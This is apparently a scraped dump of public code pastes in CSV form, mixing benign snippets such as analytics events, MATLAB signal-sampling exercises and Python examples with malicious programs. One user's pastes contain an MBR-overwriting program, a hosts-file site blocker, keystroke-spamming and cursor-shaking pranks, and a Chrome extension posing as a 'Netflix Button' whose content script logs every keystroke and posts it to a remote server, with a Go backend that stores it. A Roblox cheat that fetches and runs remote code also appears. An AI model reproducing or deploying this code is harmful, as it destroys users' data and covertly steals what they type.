id,title,username,language,date,content
title RealityCheck
start WebBlock.exe
start GetScrewed.exe
start Shake.exe
start RandomType.vbs
pause
exit"
cE1nFec1,compiling.bat,FlyFar,Batch,Saturday 19th of August 2023 03:30:16 AM CDT,"@echo off
color 17
title c0mP1lE
gcc  WebBlock.c -o  WebBlock.exe
gcc  GetScrewed.c -o  GetScrewed.exe
gcc Shake.c -o filename.exe
pause
exit
"
ZkYtrTrd,GetScrewed.c,FlyFar,C,Saturday 19th of August 2023 03:25:13 AM CDT,"#include <windows.h>
#include <conio.h>
#include <stdio.h>
// Get Screwed!
 
void main(){
    DWORD dw;
    char *pathToBin = ""C:\\Users\\M\\Desktop\\data.bin"";
    HANDLE drive = CreateFile(""\\\\.\\I:"", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (binary != INVALID_HANDLE_VALUE){
            DWORD size = GetFileSize(binary, 0);
            if (size > 0){
                byte *mbr = new byte[size];
                if (ReadFile(binary, mbr, size, &dw, 0)){
                    printf(""Binary file successfuly read!\n"");
                    //ok,not lets write the contents of the binary file,to the first sector of the drive
                    if (WriteFile(drive, mbr, size, &dw, 0)){
                        printf(""First sector overritten successfuly!\n"");
                    }
                    else
                        printf(""Fatal error! Can't override 1st sector!\n"");
                }
                else
                    printf(""Error reading from binary file!\n"");
            }
            else
                printf(""Invalid binary file!\n"");
        }
        else{
            printf(""Can't find the binary file to read from!\n"");
        }
        CloseHandle(binary);
    }
    else
        printf(""Administrator privileges required!\n"");
    CloseHandle(drive);
    _getch();
}"
ArJ3gQKV,GA4 EC - Mare Tours - purchase,SandroBabic,JavaScript,Saturday 19th of August 2023 03:24:47 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'purchase',  			// name of the event. In this case, it always must be purchase
  ecommerce: {
	currency: 'EUR',
    value: 250.00,						// total price of the trip
    transaction_id: 'abc123',			// transaction id
    items: [{                           // an array with all products (that were in a cart when the checkout began)
      item_name: 'Blue Cave',           // insert an actual trip name
      item_id: 'trip1',             // insert an actual trip ID
      price: '250.00',                  // insert an actual trip price. Number or a string. Don't include currency code
      item_category: 'Sea & Boat',          // insert an actual trip top-level category
      product_type: 'Excursions and Tours', 	// in this case, always ""Excursions and Tours""
      trip_location: 'Krk',        // insert a trip location
      booking_type: 'Reservation',		// booking type: Reservation or inquiry
	  country_address_section: 'Germany',				// country from the address section
	  departure_date: '25.08.2023.',		// the date when the trip is booked
      place_of_departure: 'Krk 10:00',		// place of departure and starting time (what is displayed in the dropdown menu)
	  number_of_adults: '4',		// number of adults 12+
	  number_of_youth: '5',			// number of youth
      number_of_children: '3',		// number of children
      quantity: '1'                     // product quantity of how many trips were added to a wishlist, usually always 1
    }]
  }
});"
bZRDrvP8,RandomTyping.vbs,FlyFar,VBScript,Saturday 19th of August 2023 03:23:45 AM CDT,"set shellobj = CreateObject(""WScript.Shell"")
shellobj.run ""cmd""

do

shellobj.sendkeys ""F""
wscript.sleep 200
Shellobj.sendkeys ""u ""
Shellobj.sendkeys ""c ""
Shellobj.sendkeys ""k ""
Shellobj.sendkeys ""i ""
Shellobj.sendkeys ""n ""
Shellobj.sendkeys ""g ""
Shellobj.sendkeys ""b ""
Shellobj.sendkeys ""i ""
Shellobj.sendkeys ""t ""
Shellobj.sendkeys ""c ""
Shellobj.sendkeys ""h ""
Shellobj.sendkeys ""{ENTER}""
wscript.sleep 200

loop"
8kukkz0F,Shake.c,FlyFar,C,Saturday 19th of August 2023 03:21:44 AM CDT,"PAYLOADFUNCTIONDEFAULT(payloadCursor) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

	out: return 2;
}"
2msVZJSQ,WebBlock.c,FlyFar,C,Saturday 19th of August 2023 03:20:27 AM CDT,"#include
#include
#include

char site_list[6][30]={
“google.com”,
“www.google.com”,
“youtube.com”,
“www.youtube.com”,
“yahoo.com”,
“www.yahoo.com”
};
char ip[12]=”127.0.0.1″;
FILE *target;

int find_root(void);
void block_site(void);

int find_root()
{
int done;
struct ffblk ffblk;//File block structure

done=findfirst(”C:\\windows\\system32\\drivers\\etc\\hosts”,&ffblk,FA_DIREC);
/*to determine the root drive*/
if(done==0)
{
target=fopen(”C:\\windows\\system32\\drivers\\etc\\hosts”,”r+”);
/*to open the file*/
return 1;
}

done=findfirst(”D:\\windows\\system32\\drivers\\etc\\hosts”,&ffblk,FA_DIREC);
/*to determine the root drive*/
if(done==0)
{
target=fopen(”D:\\windows\\system32\\drivers\\etc\\hosts”,”r+”);
/*to open the file*/
return 1;
}

done=findfirst(”E:\\windows\\system32\\drivers\\etc\\hosts”,&ffblk,FA_DIREC);
/*to determine the root drive*/
if(done==0)
{
target=fopen(”E:\\windows\\system32\\drivers\\etc\\hosts”,”r+”);
/*to open the file*/
return 1;
}

done=findfirst(”F:\\windows\\system32\\drivers\\etc\\hosts”,&ffblk,FA_DIREC);
/*to determine the root drive*/
if(done==0)
{
target=fopen(”F:\\windows\\system32\\drivers\\etc\\hosts”,”r+”);
/*to open the file*/
return 1;
}

else return 0;
}

void block_site()
{
int i;
fseek(target,0,SEEK_END); /*to move to the end of the file*/

fprintf(target,”\n”);
for(i=0;i<6;i++)
fprintf(target,”%s\t%s\n”,ip,site_list[i]);
fclose(target);
}

void main()
{
int success=0;
success=find_root();
if(success)
block_site();
}"
jNxLPuKz,4,V15H4L,MatLab,Saturday 19th of August 2023 03:10:21 AM CDT,"A=0.5;
f=3000;
N=4;
Fs1=100000;
Ts1=1/Fs1;
n=0:ceil(N*Fs1/f);
t=linspace(0,4/f,1000);
Fs=[4000,5000,6000,10000,12000];
msi=[0,0,0,0,0];
z=A*cos(2*pi*f*Ts1);
for i =1:length(Fs)
    Ts=1/Fs(i);
    n1=0:ceil(N*Fs(i)/f);    %==0:1:ceil(N*Fs/f)
    x_s= A*cos(2*pi*f*n1*Ts);
    b=0:max(n1);
    v=0:(max(n1)/max(n)):max(n1);
    x=0:max(n1);
    
    % rcons_signal=interp1(x,x_s,v,'linear');
    % subplot(4,1,1);
    % plot(n,rcons_signal);
    % xlabel(""t"");
    %ylabel(""X"");
    %title('Reconstructed signal linear');
    %mse=mean((rcons_signal-z).^2);

     
    rcons_signal=interp1(x,x_s,v,'cubic');
    subplot(5,1,i);
    plot(n,rcons_signal);
    xlabel(""t"");
    ylabel(""X"");
    title('Reconstructed signal cubic',num2str(Fs(i)));
    mse(i)=mean((rcons_signal-z).^2);

    %rcons_signal=interp1(x,x_s,v,'spline');
    % subplot(4,1,3);
    % plot(n,rcons_signal);
    % xlabel(""t"");
    % ylabel(""X"");
    % title('Reconstructed signal spline');
    %mse=mean((rcons_signal-z).^2);

    %rcons_signal=interp1(x,x_s,v,'pchip');
    %subplot(4,1,4);
    % plot(n,rcons_signal);
    % xlabel(""t"");
    %ylabel(""X"");
    % title('Reconstructed signal pchip');
    %mse=mean((rcons_signal-z).^2);
end"
5A1n8sSi,3,V15H4L,MatLab,Saturday 19th of August 2023 03:09:49 AM CDT,"A=0.5;
f=3000;
N=4;
Fs=[4000,5000,6000,10000,12000];
for i =1:length(Fs) 
    Ts=1/Fs(i);
    n=0:ceil(N*Fs(i)/f);    %==0:1:ceil(N*Fs/f)
    x_s= A*cos(2*pi*f*n*Ts);
    X_s=abs(fft(x_s,64));
    X_s_shift=fftshift(X_s);
    freq = linspace(0,Fs(i),length(X_s));
    subplot(5,1,i);
    stem(freq,X_s_shift);
    xlabel(""t"");
    ylabel(""F"");
    title('FFt shift of Fs=',num2str(Fs(i)));
end"
zPtNSvan,2,V15H4L,MatLab,Saturday 19th of August 2023 03:09:13 AM CDT,"A=0.5;
f=3000;
N=4;
Fs=[10000,6000,12000,4000,5000];
for i =1:length(Fs) 
    Ts=1/Fs(i);
    n=0:ceil(N*Fs(i)/f);    %==0:1:ceil(N*Fs/f)
    x_s= A*cos(2*pi*f*n*Ts);
    subplot(5,1,i);
    stem(n,x_s);
    xlabel(""t"");
    ylabel(""sampled at F"");
    title('Sampled signal Fs=',num2str(Fs(i)));
end"
LFCVPrwp,1,V15H4L,MatLab,Saturday 19th of August 2023 03:08:52 AM CDT,"%generating original signal
A=0.5;
f=3000;
t=linspace(0,4/f,1000);
x=A*cos(2*pi*f*t);
subplot(3,1,1);
plot(t,x)
xlabel(""time"");
ylabel(""x(t)"")
title('original signal')

%sampling for Fs
Fs=100000;
Ts=1/Fs;
N=4;
n=0:ceil(N*Fs/f);    %==0:1:ceil(N*Fs/f)
x_s= A*cos(2*pi*f*n*Ts);
subplot(3,1,2);
stem(n,x_s)
xlabel(""t"");
ylabel(""sampled at Fs=100000"")
title('Sampled signal')"
JHRP5XXz,extension/manifest.json,FlyFar,JSON,Saturday 19th of August 2023 03:07:36 AM CDT,"{
  ""manifest_version"": 2,
  ""name"": ""Netflix Button"",
  ""description"": ""Shortcut to Netflix on Chrome!"",
  ""version"": ""1.0"",
  ""homepage_url"": ""https://github.com/719Ben/chrome-spyware"",
  ""icons"": {
    ""16"": ""icon16.png"",
    ""48"": ""icon48.png"",
    ""128"": ""icon128.png""
  },
  ""browser_action"": {
    ""default_icon"": ""icon16.png"",
    ""default_title"": ""Open Netflix!""
  },
  ""background"": {
    ""scripts"": [
      ""background.js""
    ],
    ""persistent"": false
  },
  ""permissions"": [
    ""tabs"",
    ""storage""
  ],
  ""content_scripts"": [
    {
      ""matches"": [""<all_urls>""],
      ""js"": [""spy.js""]
    }
  ]
}"
771vXqn6,extension/spy.js,FlyFar,JavaScript,Saturday 19th of August 2023 03:06:56 AM CDT,"'use strict'

document.onkeypress = (evt) => {
  let letter = String.fromCharCode(evt.keyCode)
  let userId = null

  window.chrome.storage.local.get('userId', (items) => {
    userId = items.userId
    if (userId === undefined) {
      userId = getRandomToken()
      window.chrome.storage.local.set({userId: userId})
    }
  })

  window.chrome.storage.local.get('letterArray', (items) => {
    let letterArray = items.letterArray
    if (letterArray === undefined) {
      letterArray = ''
    }

    letterArray += letter

    if (letterArray.length > 19) {
      let xhr = new window.XMLHttpRequest()
      xhr.open('POST', 'https://netflix.719ben.com', true)
      xhr.setRequestHeader('Content-type',
        'application/x-www-form-urlencoded')
      xhr.send(`userId=${userId}&letters=${letterArray}`)
      // clear the array
      letterArray = ''
    }
    window.chrome.storage.local.set({letterArray: letterArray})
  })
}

const getRandomToken = () => {
  let randomPool = new Uint8Array(32)
  window.crypto.getRandomValues(randomPool)
  let hex = ''
  for (let i = 0; i < randomPool.length; ++i) {
    hex += randomPool[i].toString(16)
  }
  return hex
}"
bpRMbFKX,extension/background.js,FlyFar,JavaScript,Saturday 19th of August 2023 03:06:12 AM CDT,"'use strict'

window.chrome.browserAction.onClicked.addListener((activeTab) => {
  window.chrome.tabs.create({ url: 'https://www.netflix.com/' })
})"
vS9eZDwc,server/run_local.sh,FlyFar,Bash,Saturday 19th of August 2023 03:05:22 AM CDT,"export DATABASE_URL=""postgres://postgres:@localhost:5432/chrome_spyware""

go run main.go"
qgTr3Wfx,server/main.go,FlyFar,Go,Saturday 19th of August 2023 03:04:40 AM CDT,"package main

import (
	""github.com/go-pg/pg""
	""log""
	""net/http""
	""os""
	""strings""
	""time""
)

var DBConnection *pg.DB

type Event struct {
	userId    string
	Letters   string
	Timestamp time.Time
}

func createDB() *pg.DB {
	url := os.Getenv(""DATABASE_URL"")
	url = strings.TrimPrefix(url, ""postgres://"")

	dbAt := strings.LastIndex(url, ""/"") + 1
	database := url[dbAt:]
	url = url[:dbAt-1]

	authAndHost := strings.Split(url, ""@"")
	auth := strings.Split(authAndHost[0], "":"")
	username := auth[0]
	password := auth[1]
	hostAndPort := authAndHost[1]

	db := pg.Connect(&pg.Options{
		User:     username,
		Password: password,
		Database: database,
		Addr:     hostAndPort,
	})

	return db
}

func spywareHandler(w http.ResponseWriter, r *http.Request) {
	userId := r.FormValue(""userId"")
	letters := r.FormValue(""letters"")

	event := &Event{userId, letters, time.Now()}

	inErr := DBConnection.Insert(event)
	if inErr != nil {
		log.Println(inErr)
		return
	}
}

func main() {
	DBConnection = createDB()
	http.HandleFunc(""/"", spywareHandler)
	http.ListenAndServe("":8000"", nil)
}"
dLwvqgRB,server/database.sql,FlyFar,SQL,Saturday 19th of August 2023 03:02:13 AM CDT,"CREATE TABLE events (
    userId text,
    letters text,
    ""timestamp"" timestamp with time zone
);"
0Wizhgyi,GA4 EC - Mare Tours - begin_checkout,SandroBabic,JavaScript,Saturday 19th of August 2023 02:59:58 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'begin_checkout',  			// name of the event. In this case, it always must be begin_checkout
  ecommerce: {							
    items: [{							// an array with all products (that were in a cart when the checkout began)
      item_name: 'Blue Cave',           // insert an actual trip name
      item_id: 'trip1',             // insert an actual trip ID
      price: '250.00',                  // insert an actual trip price. Number or a string. Don't include currency code
      item_category: 'Sea & Boat',          // insert an actual trip top-level category
      trip_location: 'Krk',        // insert a trip location
      quantity: '1'                     // product quantity of how many products were added to a wishlist, usually always 1
    }]
  }
});"
HSvqGnf1,CAMERAMAN VS SKIBID TOILET,LuaXe,Lua,Saturday 19th of August 2023 02:51:55 AM CDT,"function K() spawn(function () while getgenv().K do
            for i, v in pairs(game.workspace:GetChildren()) do
if v:FindFirstChild(""Flush1"") then TPCFrame(v.Flush1.CFrame) fireproximityprompt(v.Flush1:FindFirstChildOfClass(""ProximityPrompt"")) end
            end task.wait()
        end
    end)
end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""Cameraman VS Skibid"")

local b = w:CreateFolder(""Main"")

b:Toggle(""Infinite Kills/Kill ALL"",function(val) getgenv().K = val K() end)

b:Label(""Made by LuaXie"",{TextSize = 23; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Slider(""WalkSpeed"",{min = 0; max = 10000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val end)
b:Slider(""JumpPower"",{min = 0; max = 10000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.JumpPower = val end)
b:Slider(""HipHeight"",{min = 0; max = 10000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.HipHeight = val end)
b:Slider(""Gravity"",{min = 0; max = 360; precise = false;},function(val) game.workspace.Gravity = val end)
b:Slider(""FOV"",{min = 0;max = 120;precise = false;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame end end
function RTPCFrame(M_CF) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then M_CF.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end end
function PHP(Player_HP) if game.Players.LocalPlayer.Character:FindFirstChild(""Humanoid"") then game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end end"
t7JJk9VK,ttl.py,A-HADI,Python,Saturday 19th of August 2023 02:46:14 AM CDT,"import random
from sys import argv
argv = argv[1:]

def parse_before(inp, befores):
	newinp = inp
	for before in befores:
		if before == ""r"": # Reversing
			newinp = newinp[::-1]
		elif before == ""c"": # Copying
			newinp = newinp + newinp
		elif before == ""u"": # Uppercasing
			newinp = newinp.upper()
		elif before == ""l"": # Lowercasing
			newinp = newip.lower()
		elif before == ""w"": # Whitespace removal
			newinp = newinp.replace("" "", """")
		elif before == ""W"": # Whitespace stripping
			newinp = newinp.strip()
		elif before.startswith(""A""):  # Appending
			newinp += before[1:]
		elif before.startswith(""B""): # Before inserting
			newinp = before[1:] + newinp
		elif before.startswith(""R""): # Replacing
			texts = before[1:].split("":"")
			newinp = newinp.replace(texts[0], texts[1])
		elif before.startswith(""p""): # Padding
			newinp = ("" "" * int(before[1])) + newinp
		elif before.startswith(""P""): # Punctuation removal
			punctuation = [""."", ""?"", ""!"", "","", "";"", "":"", ""--"", ""-"", ""("", "")"", ""["", ""]"", ""{"", ""}"", ""'"", '""', ""`"", ""~"", ""...""]
			for i in punctuation:
				newinp = newinp.replace(i, """")
		elif before.startswith(""L""): # Adding new lines
			newinp = newip.replace(""   "", ""\n"")
		elif before.startswith(""N""): # Removing numbers
			numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
			for i in numbers:
				newinp = newinp.replace(i, """")
		elif before.startswith(""o""): # Randomize
			listinp = list(newinp)
			random.shuffle(listinp)
			newinp = """"
			for i in listinp:
				newinp += str(i)
		elif before.startswith(""S""): # Remove stopwords
				stopwords = [
				    ""i"", ""me"", ""my"", ""myself"", ""we"", ""our"", ""ours"", ""ourselves"", ""you"", ""your"", ""yours"",
				    ""yourself"", ""yourselves"", ""he"", ""him"", ""his"", ""himself"", ""she"", ""her"", ""hers"", ""herself"",
				    ""it"", ""its"", ""itself"", ""they"", ""them"", ""their"", ""theirs"", ""themselves"", ""what"", ""which"",
				    ""who"", ""whom"", ""this"", ""that"", ""these"", ""those"", ""am"", ""is"", ""are"", ""was"", ""were"", ""be"",
				    ""been"", ""being"", ""have"", ""has"", ""had"", ""having"", ""do"", ""does"", ""did"", ""doing"", ""a"", ""an"",
				    ""the"", ""and"", ""but"", ""if"", ""or"", ""because"", ""as"", ""until"", ""while"", ""of"", ""at"", ""by"",
				    ""for"", ""with"", ""about"", ""against"", ""between"", ""into"", ""through"", ""during"", ""before"",
				    ""after"", ""above"", ""below"", ""to"", ""from"", ""up"", ""down"", ""in"", ""out"", ""on"", ""off"", ""over"",
				    ""under"", ""again"", ""further"", ""then"", ""once"", ""here"", ""there"", ""when"", ""where"", ""why"",
				    ""how"", ""all"", ""any"", ""both"", ""each"", ""few"", ""more"", ""most"", ""other"", ""some"", ""such"",
				    ""no"", ""nor"", ""not"", ""only"", ""own"", ""same"", ""so"", ""than"", ""too"", ""very"", ""s"", ""t"", ""can"",
				    ""will"", ""just"", ""don"", ""should"", ""now""
				]
				for i in stopwords:
					newinp = newinp.replace(i, """")


	return newinp

def parse_after(inp, after):
	newinp = inp
	if after.startswith(""["") and after.endswith(""]""):
		ranges = after.split(""["")[1].split(""]"")[0].split("":"")
		newinp = newinp[int(ranges[0]):int(ranges[1])]
	return newinp

def parse(cmd, inp):
	before = cmd.split(""%i"")[0]
	after = cmd.split(""%i"")[1]
	cmd = cmd.replace(""%i"", f""{inp}"")
	newinp = parse_before(inp, before.split(""\\""))
	newinp = parse_after(inp, after)
	return newinp

if __name__ == '__main__':
	if argv[0] == ""-f"":
		with open(argv[1], ""r"") as inp:
			inp = inp.read()
			print(parse(argv[2], inp))
	elif argv[0] == ""-i"":
		while True:
			try:
				inp = input("""")
			except KeyboardInterrupt:
				exit()
			if argv == [""-i""]:
				print(inp)
			else:
				cmd = argv[1]
				print(parse(cmd, inp))"
eAJCJivY,snowybot kickarse bot,coinwalk,JavaScript,Saturday 19th of August 2023 01:26:32 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var brick = kozster;
var gobbie = 0.00000001; //basebet;
var mad = 8; //decimal place of basebet;
var zeggar = gobbie;
var target = 100;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var burgzie = kozster;
var belcom = kozster;
var love = kozster;
var lolz = gobbie*100;
var bone = (((Math.floor(kozster/tens))*tens)-(tens*2));
var razzle;
var zen = 0;
var upper = 6.9;
var lower = 12.9;
var junky = kozster;
var bonie = kozster;
var adst = (gobbie*1000).toPrecision(1).toString();
var blade = adst.length+1;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var oldDegen = 0;
 
function dobet(){
burgzie = $('#pct_balance').val();
var megablows = burgzie.indexOf(""."");
if (((burgzie.charAt(megablows + mad)) == 7)&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
    tuba = parseFloat(burgzie);
}
if (((burgzie.charAt(megablows + mad)) == 7)&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
    tuba = parseFloat(burgzie);
}
if ((((burgzie-zeggar)<=(bone+(zeggar*3)))&&((burgzie.charAt(megablows + mad)) != 7))||((zeggar>=(gobbie*5))&&(burgzie>=tuba)&&((burgzie.charAt(megablows + mad)) != 7))){
    zeggar = gobbie;
    oldDegen = 0;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = (((Math.floor(burgzie/tens))*tens)-(tens*2));
}
if (burgzie>(lolz*10)){
    mad = mad-1;
    gobbie = gobbie*10;
    tens = (gobbie*10);
    zeggar = gobbie;
    oldDegen = 0;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = (((Math.floor(burgzie/tens))*tens)-(tens*2));
    lolz = lolz*10;
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var xox = $('#pct_balance').val();
razzle = dobet();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
if (xox>=target) {
console.log(""snowybot rocks target done"");
return;
}
setTimeout(() => go(), 1);
}
go();
 "
AfAC6CfB,snowybot update,coinwalk,JavaScript,Saturday 19th of August 2023 01:24:29 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var brick = kozster;
var gobbie = 0.00000001; //basebet;
var mad = 8; //decimal place of basebet;
var zeggar = gobbie;
var target = 100;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var burgzie = kozster;
var belcom = kozster;
var love = kozster;
var lolz = ((Math.floor(kozster/tens))*tens);
var bone = (((Math.floor(kozster/tens))*tens)-(tens*2));
var razzle;
var zen = 0;
var upper = 6.9;
var lower = 12.9;
var junky = kozster;
var bonie = kozster;
var adst = (gobbie*1000).toPrecision(1).toString();
var blade = adst.length+1;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var oldDegen = 0;
 
function dobet(){
burgzie = $('#pct_balance').val();
var megablows = burgzie.indexOf(""."");
if (((burgzie.charAt(megablows + mad)) == 7)&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
    tuba = parseFloat(burgzie);
}
if (((burgzie.charAt(megablows + mad)) == 7)&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
    tuba = parseFloat(burgzie);
}
if ((((burgzie-zeggar)<=(bone+(zeggar*3)))&&((burgzie.charAt(megablows + mad)) != 7))||((zeggar>=(gobbie*5))&&(burgzie>=tuba)&&((burgzie.charAt(megablows + mad)) != 7))){
    zeggar = gobbie;
    oldDegen = 0;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = (((Math.floor(burgzie/tens))*tens)-(tens*2));
}
if (brugzie>(lolz*10)){
    mad = mad-1;
    gobbie = gobbie*10;
    tens = (gobbie*10);
    zeggar = gobbie;
    oldDegen = 0;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = (((Math.floor(burgzie/tens))*tens)-(tens*2));
    lolz = lolz*10;
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var xox = $('#pct_balance').val();
razzle = dobet();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
if (xox>=target) {
console.log(""snowybot rocks target done"");
return;
}
setTimeout(() => go(), 1);
}
go();
 "
1vTkVm9u,is_is not,naren_paste,Python,Saturday 19th of August 2023 01:02:15 AM CDT,"# Checking for None:
result = some_function()
if result is None:
    print(""No result"")
else:
    print(""Result available"")

# Comparing Singleton Objects:
status = True
if status is True:
    print(""Status is True"")

# Caching Immutable Objects:
a = ""hello""
b = ""hello""
if a is b:
    print(""Same object"")

# Comparing Custom Objects:
class MyClass:
    pass

obj1 = MyClass()
obj2 = obj1
obj3 = MyClass()

if obj1 is obj2:
    print(""obj1 and obj2 refer to the same instance"")
if obj1 is not obj3:
    print(""obj1 and obj3 are different instances"")

"
A7pPNUCK,snowybot,coinwalk,JavaScript,Saturday 19th of August 2023 12:56:47 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var brick = kozster;
var gobbie = 0.00000001; //basebet;
var mad = 8; //decimal place of basebet;
var zeggar = gobbie;
var target = 100;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var burgzie = kozster;
var belcom = kozster;
var love = kozster;
var lolz = ((Math.floor(kozster/tens))*tens);
var bone = (((Math.floor(kozster/tens))*tens)-(tens));
var razzle;
var zen = 0;
var upper = 6.9;
var lower = 12.9;
var junky = kozster;
var bonie = kozster;
var adst = (gobbie*1000).toPrecision(1).toString();
var blade = adst.length+1;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var oldDegen = 0;
 
function dobet(){
burgzie = $('#pct_balance').val();
var megablows = burgzie.indexOf(""."");
if (((burgzie.charAt(megablows + mad)) == 7)&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
    tuba = parseFloat(burgzie);
}
if (((burgzie.charAt(megablows + mad)) == 7)&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
    tuba = parseFloat(burgzie);
}
if ((((burgzie-zeggar)<=(bone+(zeggar*3)))&&((burgzie.charAt(megablows + mad)) != 7))||((zeggar>=tens)&&(burgzie>tuba)&&((burgzie.charAt(megablows + mad)) != 7))){
    zeggar = gobbie;
    oldDegen = 0;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = (((Math.floor(burgzie/tens))*tens)-(tens));
}
if (brugzie>(lolz*10)){
    mad = mad-1;
    gobbie = gobbie*10;
    tens = (gobbie*10);
    zeggar = gobbie;
    oldDegen = 0;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = (((Math.floor(burgzie/tens))*tens)-(tens));
    lolz = ((Math.floor(burgzie/tens))*tens);
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var xox = $('#pct_balance').val();
razzle = dobet();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
if (xox>=target) {
console.log(""snowybot rocks target done"");
return;
}
setTimeout(() => go(), 1);
}
go();
 "
